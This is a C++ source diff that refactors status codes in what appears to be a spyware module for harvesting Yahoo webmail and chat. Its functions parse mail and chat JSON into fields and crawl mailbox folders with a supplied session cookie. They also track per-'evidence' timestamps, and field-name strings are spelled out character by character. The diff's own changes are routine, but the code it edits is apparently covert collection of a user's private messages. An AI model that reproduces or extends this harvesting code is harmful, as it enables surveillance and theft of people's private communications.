-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
 	//get the obj part
 	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());
 
 	//get obj values
 	if(!wcscmp(strBuffer, L"HEADER"))
-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
 	//get partid field
 	dwLen = wcsnlen_s(jMail[strPartIdFld]->AsString().c_str(), _TRUNCATE);
@@ -2566,7 +2549,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strPartId = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
 		if(lpMailFields->strPartId == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strPartId, dwLen+1, jMail[strPartIdFld]->AsString().c_str());
 	}
 
@@ -2576,7 +2559,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strSubType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
 		if(lpMailFields->strSubType == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strSubType, dwLen+1, jMail[strSubTypeFld]->AsString().c_str());
 	}
 
@@ -2586,7 +2569,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
 		if(lpMailFields->strType == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strType, dwLen+1, jMail[strTypeFld]->AsString().c_str());
 	}
 
@@ -2596,7 +2579,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strEncoding = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
 		if(lpMailFields->strEncoding == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strEncoding, dwLen+1, jMail[strEncodingFld]->AsString().c_str());
 	}
 
@@ -2606,7 +2589,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strDisposition = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
 		if(lpMailFields->strDisposition == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strDisposition, dwLen+1, jMail[strDispositionFld]->AsString().c_str());
 	}
 
@@ -2621,7 +2604,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 		{
 			pYHMailFields->strCids = (LPWSTR)zalloc((dwLen * sizeof(WCHAR)) + 2);
 			if(pYHMailFields->strCids == NULL)
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			wcscpy_s(pYHMailFields->strCids, dwLen+1, jObj[0]->AsString().c_str());
 		}
 	}
@@ -2642,8 +2625,8 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 				{
 					//alloc size for boundaries
 					lpMailBoundaries->dwTotItems += 1;
-					if(YHAddBoundary(&lpMailBoundaries->lpBoundaries, lpMailBoundaries->dwTotItems, pwsSub, lpMailFields->strPartId) == YAHOO_ALLOC_ERROR)
-						return YAHOO_ALLOC_ERROR;
+					if(YHAddBoundary(&lpMailBoundaries->lpBoundaries, lpMailBoundaries->dwTotItems, pwsSub, lpMailFields->strPartId) == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
+						return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 					lpMailBoundaries->dwCurrentItem = lpMailBoundaries->dwTotItems-1;										
 				}
@@ -2653,7 +2636,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 			wcscpy_s(lpMailFields->strTypeParams, dwLen+1, jMail[strTypeParamsFld]->AsString().c_str());
 		}
 		else
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//get text field
@@ -2662,7 +2645,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	{
 		lpMailFields->strText = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
 		if(lpMailFields->strText == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpMailFields->strText, dwLen+1, jMail[strTextFld]->AsString().c_str());
 	}
 
@@ -2677,7 +2660,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 			//alloc dest buffer
 			LPSTR strFullBody = (LPSTR)malloc(dwSize+1);
 			if(strFullBody == NULL)
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 			//conversion
 			dwSize = WideCharToMultiByte(CP_UTF8, 0, lpMailFields->strText, -1, strFullBody, dwSize, 0, 0);
@@ -2705,7 +2688,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	}
 */
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2713,7 +2696,7 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 {
 	//parse the returned json tree
 	JSONArray  jArray;		
-	DWORD	dwLen, dwSize;
+	DWORD	dwLen;
 	WCHAR   strBuffer[32];
 
 	//json
@@ -2723,14 +2706,14 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 	WCHAR strTypeFld[]		= { L't', L'y', L'p', L'e', L'\0' };					//value	
 	
 	if(!jMail[strPartIdFld]->IsString())
-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
 	//get the obj part
 	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());
 
 	//get obj values
 	if(!wcscmp(strBuffer, L"HEADER"))
-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
 	//get subtype field
 	dwLen = wcsnlen_s(jMail[strSubTypeFld]->AsString().c_str(), _TRUNCATE);
@@ -2738,7 +2721,7 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 	{
 		lpChatFields->strSubType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
 		if(lpChatFields->strSubType == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpChatFields->strSubType, dwLen+1, jMail[strSubTypeFld]->AsString().c_str());
 	}
 
@@ -2748,7 +2731,7 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 	{
 		lpChatFields->strType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
 		if(lpChatFields->strType == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpChatFields->strType, dwLen+1, jMail[strTypeFld]->AsString().c_str());
 	}
 
@@ -2758,11 +2741,11 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 	{
 		lpChatFields->strText = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
 		if(lpChatFields->strText == NULL)
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		wcscpy_s(lpChatFields->strText, dwLen+1, jMail[strTextFld]->AsString().c_str());
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 /*
@@ -2776,7 +2759,7 @@ DWORD YHExtractPartID(LPWSTR strPartID, DWORD *dwPartID)
 	//alloc tmp string
 	strTmp = (LPWSTR)zalloc(wcslen(strPartID) + 1);
 	if(strTmp == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//extract the non-numeric values from the partid
 	for(i=0, j=0; strPartID[i]!=0; i++)
@@ -2788,7 +2771,7 @@ DWORD YHExtractPartID(LPWSTR strPartID, DWORD *dwPartID)
 
 	*dwPartID = atoi(strTmp);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 */
 
@@ -2796,7 +2779,7 @@ DWORD YHExtractPartID(LPWSTR strPartID, DWORD *dwPartID)
 DWORD YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR strBoundary, LPWSTR strPartID)
 {
 	LPYAHOO_MAIL_BOUNDARY* pOld = NULL;	
-	DWORD dwSize, nCurItem, i;
+	DWORD dwSize, nCurItem;
 
 	dwSize = sizeof(LPYAHOO_MAIL_BOUNDARY) * nItems;
 
@@ -2806,7 +2789,7 @@ DWORD YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR st
 	if(*pBoundaries == NULL)
 	{	
 		free(pOld);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	nCurItem = nItems-1;
@@ -2833,7 +2816,7 @@ DWORD YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR st
 	wcscpy_s((*pBoundaries)[nCurItem]->strPartID, dwSize, strPartID);
 
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2845,14 +2828,12 @@ DWORD YHDelBoundary(LPYAHOO_MAIL_BOUNDARY* pBoundaries, DWORD dwItem)
 	znfree((LPVOID*)&pBoundaries[dwItem]->strPartID);
 	znfree((LPVOID*)&pBoundaries[dwItem]);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 DWORD YHFreeBoundaries(LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries)
 {	
-	DWORD dwSize, i;
-
-	for(i=0; i<lpMailBoundaries->dwTotItems; i++)
+	for(DWORD i=0; i<lpMailBoundaries->dwTotItems; i++)
 	{
 		//free boundary items
 		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]->strBoundary);
@@ -2860,7 +2841,7 @@ DWORD YHFreeBoundaries(LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries)
 		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]);
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -3023,7 +3004,7 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 		}
 
 		//parse mail folder
-		if(YHParseMailBox(strFolderName, strCookie, &YHParams, bIncoming, bDraft) == YAHOO_ALLOC_ERROR)
+		if(YHParseMailBox(strFolderName, strCookie, &YHParams, bIncoming, bDraft) == (DWORD)YahooStatus::YAHOO_ALLOC_ERROR)
 			iItem = jFolders.size() + 1; //exit from the loop
 
 		//free heap
@@ -3141,7 +3122,7 @@ DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 	//alloc a new buffer 512 byte bigger than the original
 	*lpUTFBuf = (LPWSTR)zalloc(dwNewSize*sizeof(WCHAR));
 	if(*lpUTFBuf == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	SecureZeroMemory(*lpUTFBuf, dwNewSize);
 
@@ -3175,7 +3156,7 @@ DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 			if(*lpUTFBuf == NULL)
 			{
 				znfree((LPVOID*)pOldBuf);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 			*((*lpUTFBuf)+dwWR+dwLen) = 0;
 
@@ -3221,7 +3202,7 @@ DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 	//null terminate the buffer
 	*((*lpUTFBuf)+(dwWR)) = 0;
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 //verify if che char must be converted to utf
@@ -3285,7 +3266,7 @@ void zndelete(__in LPVOID* pMem)
 
 
 //get the last timestamp used for the requested evidence type
-DWORD YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
+DWORD YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPCSTR pstrSuffix)
 {
 	char	strTSName[64];
 	char	*pEnc = NULL;
@@ -3297,7 +3278,7 @@ DWORD YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
 	//encode the suffix
 	pEnc = base64_encodeY((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
 	if(pEnc == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//add the suffix
 	strcat_s(strTSName, sizeof(strTSName), pEnc);
@@ -3308,12 +3289,12 @@ DWORD YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
 	//get last timestamp saved
 	pYHParams->dwLowTS = GetLastFBTstamp(strTSName, &pYHParams->dwHighTS);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
 //set the last timestamp used for the requested evidence type
-DWORD YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
+DWORD YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPCSTR pstrSuffix)
 {
 	char	strTSName[64];
 	char	*pEnc = NULL;
@@ -3325,7 +3306,7 @@ DWORD YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
 	//encode the suffix
 	pEnc = base64_encodeY((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
 	if(pEnc == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//add a suffix
 	strcat_s(strTSName, sizeof(strTSName), pEnc);
@@ -3335,5 +3316,5 @@ DWORD YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrSuffix)
 	//get last timestamp saved	
 	SetLastFBTstamp(strTSName, pYHParams->dwLowTS, pYHParams->dwHighTS);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
